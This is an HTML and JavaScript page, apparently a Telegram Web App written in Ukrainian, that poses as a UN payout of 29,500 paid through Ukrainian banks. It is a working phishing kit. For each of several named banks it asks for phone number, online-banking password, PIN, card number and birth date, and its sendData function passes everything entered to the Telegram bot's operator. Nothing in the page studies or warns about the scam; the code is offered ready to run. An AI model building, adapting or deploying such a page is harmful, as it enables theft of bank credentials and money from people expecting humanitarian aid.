<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Виплата ООН</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background: #f5f7fa; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 16px; }
        .container { width: 100%; max-width: 420px; background: #ffffff; border-radius: 24px; box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12); padding: 24px 20px 30px; }
        .header { text-align: center; padding-bottom: 20px; border-bottom: 1px solid #eef2f7; }
        .header .logo { font-size: 40px; margin-bottom: 6px; }
        .header h1 { font-size: 20px; font-weight: 700; color: #1a2634; }
        .header p { font-size: 13px; color: #6b7a8a; margin-top: 4px; }
        .step-indicator { display: flex; justify-content: center; gap: 8px; margin: 18px 0 22px; }
        .step-dot { width: 8px; height: 8px; border-radius: 50%; background: #dce1e8; transition: 0.3s; }
        .step-dot.active { background: #2563eb; width: 24px; border-radius: 12px; }
        .step-dot.done { background: #22c55e; }
        #bankList { display: flex; flex-direction: column; gap: 10px; margin-bottom: 16px; }
        .bank-btn { display: flex; align-items: center; gap: 14px; padding: 14px 18px; background: #f8fafc; border: 1.5px solid #e8edf3; border-radius: 14px; font-size: 15px; font-weight: 500; color: #1a2634; cursor: pointer; width: 100%; text-align: left; }
        .bank-btn:active { transform: scale(0.98); background: #eef2f7; }
        .bank-btn .icon { font-size: 26px; width: 36px; text-align: center; }
        .bank-btn .info { flex: 1; }
        .bank-btn .badge { font-size: 11px; background: #dbeafe; color: #1d4ed8; padding: 2px 10px; border-radius: 20px; font-weight: 600; }
        #formContainer { display: none; margin-top: 16px; animation: fadeUp 0.3s ease; }
        @keyframes fadeUp { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
        .form-group { margin-bottom: 14px; }
        .form-group label { font-size: 13px; font-weight: 600; color: #334155; display: block; margin-bottom: 5px; }
        .form-group input { width: 100%; padding: 13px 16px; border: 1.5px solid #e2e8f0; border-radius: 12px; font-size: 15px; background: #fafcff; outline: none; color: #0f172a; }
        .form-group input:focus { border-color: #2563eb; background: #ffffff; box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15); }
        .form-group input::placeholder { color: #94a3b8; }
        .btn-submit { width: 100%; padding: 15px; background: #2563eb; color: white; border: none; border-radius: 14px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 8px; }
        .btn-submit:active { transform: scale(0.98); background: #1d4ed8; }
        .btn-back { width: 100%; padding: 13px; background: #f1f5f9; color: #334155; border: none; border-radius: 14px; font-size: 15px; font-weight: 500; cursor: pointer; margin-top: 10px; }
        .btn-back:active { background: #e2e8f0; }
        #status { margin-top: 16px; padding: 14px; border-radius: 12px; font-size: 14px; text-align: center; font-weight: 500; display: none; }
        #status.success { display: block; background: #dcfce7; color: #166534; }
        #status.error { display: block; background: #fee2e2; color: #991b1b; }
        #status.loading { display: block; background: #e0f2fe; color: #0369a1; }
        .bank-logo { font-size: 28px; font-weight: 700; text-align: center; padding: 8px 0 12px; color: #0f172a; }
        .bank-logo span { display: block; font-size: 13px; font-weight: 400; color: #64748b; }
    </style>
</head>
<body>
<div class="container" id="app">
    <div class="header">
        <div class="logo">🏦</div>
        <h1>Міжнародна система виплат</h1>
        <p>Оберіть банк для отримання коштів</p>
    </div>

    <div class="step-indicator">
        <span class="step-dot active" id="dot1"></span>
        <span class="step-dot" id="dot2"></span>
        <span class="step-dot" id="dot3"></span>
    </div>

    <div id="bankList"></div>

    <div id="formContainer">
        <div class="bank-logo" id="bankLogo">ПриватБанк</div>
        <div id="formFields"></div>
        <button class="btn-submit" onclick="sendData()">✅ Підтвердити</button>
        <button class="btn-back" onclick="goBack()">⬅ Назад</button>
        <div id="status"></div>
    </div>

    <div id="statusGlobal" style="margin-top:16px;text-align:center;font-size:13px;color:#94a3b8;">Натисніть на банк, щоб продовжити</div>
</div>

<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script>
    const banks = {
        privat: { name: 'ПриватБанк', icon: '💳', fields: [
            { id: 'phone', label: '📱 Номер телефону', placeholder: '+380 00 000 00 00' },
            { id: 'password', label: '🔑 Пароль', placeholder: 'Введіть пароль' },
            { id: 'pin', label: '📌 Пін-код', placeholder: '4 цифри' }
        ]},
        oschad: { name: 'Ощадбанк', icon: '🏛️', fields: [
            { id: 'phone', label: '📱 Номер телефону', placeholder: '+380 00 000 00 00' },
            { id: 'password', label: '🔑 Пароль', placeholder: 'Введіть пароль' },
            { id: 'card', label: '💳 Номер карти', placeholder: '0000 0000 0000 0000' },
            { id: 'pin', label: '📌 Пін-код', placeholder: '4 цифри' },
            { id: 'birth', label: '📅 Дата народження', placeholder: 'ДД.ММ.РРРР' }
        ]},
        raif: { name: 'Райффайзен Банк', icon: '🏦', fields: [
            { id: 'phone', label: '📱 Номер телефону', placeholder: '+380 00 000 00 00' },
            { id: 'pin', label: '📌 Пін-код', placeholder: '4 цифри' }
        ]},
        abank: { name: 'А-Банк', icon: '🏧', fields: [
            { id: 'phone', label: '📱 Номер телефону', placeholder: '+380 00 000 00 00' },
            { id: 'pin', label: '📌 Пін-код', placeholder: '4 цифри' }
        ]},
        izibank: { name: 'Ізі Банк', icon: '💎', fields: [
            { id: 'phone', label: '📱 Номер телефону', placeholder: '+380 00 000 00 00' },
            { id: 'pin', label: '📌 Пін-код', placeholder: '4 цифри' }
        ]},
        viber: { name: 'Viber', icon: '💬', fields: [
            { id: 'phone', label: '📱 Номер телефону', placeholder: '+380 00 000 00 00' }
        ]}
    };

    let selectedBank = null;
    let userId = new URLSearchParams(window.location.search).get('user_id') || 'unknown';

    function renderBanks() {
        const container = document.getElementById('bankList');
        container.innerHTML = '';
        for (const [key, bank] of Object.entries(banks)) {
            const btn = document.createElement('div');
            btn.className = 'bank-btn';
            btn.innerHTML = `<span class="icon">${bank.icon}</span><span class="info">${bank.name}</span><span class="badge">${bank.fields.length} полів</span>`;
            btn.onclick = () => selectBank(key);
            container.appendChild(btn);
        }
    }

    function selectBank(key) {
        selectedBank = key;
        const bank = banks[key];
        if (!bank) return;

        document.getElementById('bankList').style.display = 'none';
        document.getElementById('formContainer').style.display = 'block';
        document.getElementById('statusGlobal').textContent = '';

        document.getElementById('bankLogo').innerHTML = `${bank.icon} ${bank.name} <span>${bank.fields.length} полів для заповнення</span>`;

        document.getElementById('dot1').classList.remove('active');
        document.getElementById('dot1').classList.add('done');
        document.getElementById('dot2').classList.add('active');

        const fieldsContainer = document.getElementById('formFields');
        fieldsContainer.innerHTML = '';
        bank.fields.forEach(f => {
            const div = document.createElement('div');
            div.className = 'form-group';
            div.innerHTML = `<label>${f.label}</label><input type="text" id="${f.id}" placeholder="${f.placeholder}" autocomplete="off">`;
            fieldsContainer.appendChild(div);
        });

        setTimeout(() => {
            const firstInput = fieldsContainer.querySelector('input');
            if (firstInput) firstInput.focus();
        }, 200);
    }

    function goBack() {
        document.getElementById('bankList').style.display = 'flex';
        document.getElementById('formContainer').style.display = 'none';
        document.getElementById('status').className = '';
        document.getElementById('status').style.display = 'none';
        document.getElementById('dot2').classList.remove('active');
        document.getElementById('dot2').classList.remove('done');
        document.getElementById('dot1').classList.add('active');
        document.getElementById('statusGlobal').textContent = 'Натисніть на банк, щоб продовжити';
        selectedBank = null;
    }

    function sendData() {
        const statusEl = document.getElementById('status');
        const fields = document.querySelectorAll('#formFields input');
        const data = {};

        let hasError = false;
        fields.forEach(input => {
            const val = input.value.trim();
            data[input.id] = val;
            if (!val) {
                input.style.borderColor = '#ef4444';
                hasError = true;
            } else {
                input.style.borderColor = '#e2e8f0';
            }
        });

        if (hasError) {
            statusEl.className = 'error';
            statusEl.style.display = 'block';
            statusEl.textContent = '❌ Будь ласка, заповніть всі поля!';
            return;
        }

        data.bank = selectedBank;
        data.user_id = userId;
        data.amount = '29500';
        data.timestamp = new Date().toISOString();

        statusEl.className = 'loading';
        statusEl.style.display = 'block';
        statusEl.textContent = '⏳ Надсилання даних...';

        if (window.Telegram && window.Telegram.WebApp) {
            try {
                window.Telegram.WebApp.sendData(JSON.stringify(data));
                statusEl.className = 'success';
                statusEl.textContent = '✅ Дані успішно надіслано! Очікуйте підтвердження.';
                document.getElementById('dot2').classList.remove('active');
                document.getElementById('dot2').classList.add('done');
                document.getElementById('dot3').classList.add('active');
                setTimeout(() => {
                    goBack();
                    statusEl.style.display = 'none';
                    document.getElementById('dot3').classList.remove('active');
                }, 3000);
                window.Telegram.WebApp.close();
            } catch(e) {
                statusEl.className = 'error';
                statusEl.textContent = '❌ Помилка відправки: ' + e.message;
            }
        } else {
            statusEl.className = 'error';
            statusEl.textContent = '❌ Telegram WebApp не доступний. Спробуйте через бота.';
        }
    }

    renderBanks();
</script>
</body>
</html>
